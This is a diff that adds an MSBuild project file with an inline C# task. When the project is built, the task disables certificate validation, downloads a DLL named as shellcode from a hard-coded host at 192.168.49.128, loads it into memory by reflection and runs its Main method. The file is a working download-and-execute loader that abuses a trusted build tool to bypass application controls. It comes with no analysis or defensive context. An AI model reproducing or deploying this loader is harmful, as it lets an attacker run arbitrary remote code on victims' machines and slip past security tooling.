@@ -1,0 +1,65 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuildPlainText">
+    <MSBuildShell />
+  </Target>
+  <UsingTask
+    TaskName="MSBuildShell"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+    
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+		using System.Net;
+		using System.Reflection;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+		
+		
+		
+        public class MSBuildShell :  Task, ITask
+        {                  
+          public override bool Execute()
+          {
+			Console.WriteLine("After Foreach");
+			var client = new System.Net.WebClient();
+
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; AppleWebKit/537.36; rv:43.0) Gecko/20100101 Firefox/43.0");
+
+            var dll = client.DownloadData("http://192.168.49.128/PruebaShellcodeYT.dll");
+            client.Dispose();
+
+            var asm = Assembly.Load(dll);
+
+            Console.WriteLine(asm.ToString());
+
+            foreach (Type type in asm.GetExportedTypes())
+            {
+                object c = Activator.CreateInstance(type);
+
+                try
+                {
+                    MethodInfo myMethod = type.GetMethod("Main");
+                    if (myMethod != null)
+                    {
+                        myMethod.Invoke(c, null);
+                        return true;
+                    }
+                }
+                catch (Exception)
+                {
+                    throw;
+                }
+            }
+			return true;
+          } 
+        }     
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
